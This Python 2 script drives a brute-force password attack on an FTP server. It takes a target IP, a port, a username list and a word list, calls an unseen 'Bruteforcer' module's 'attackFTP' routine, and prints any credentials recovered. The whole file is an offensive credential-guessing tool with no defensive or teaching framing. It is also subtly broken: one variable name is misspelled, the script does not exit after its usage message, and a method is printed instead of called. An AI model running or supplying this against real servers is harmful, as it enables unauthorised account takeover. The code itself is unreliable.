#!/usr/bin/env python

import Bruteforcer
import sys

if len(sys.argv) < 5:
  print 'USAGE: ' + sys.argv[0] + ' TARGET_IP PORT USER_LIST WORD_LIST'

target = sys.argv[1]
port = sys.argv[2]
userListLocation = sys.argv[3]
passListLocation = sys.argv[4]

ftpBruter = Bruteforcer.Bruteforcer(target, port, userListLocation, passListLocation)
ftpButer.prepareLists()
ftpBruter.attackFTP()
print ftpBruter.returnCredentials
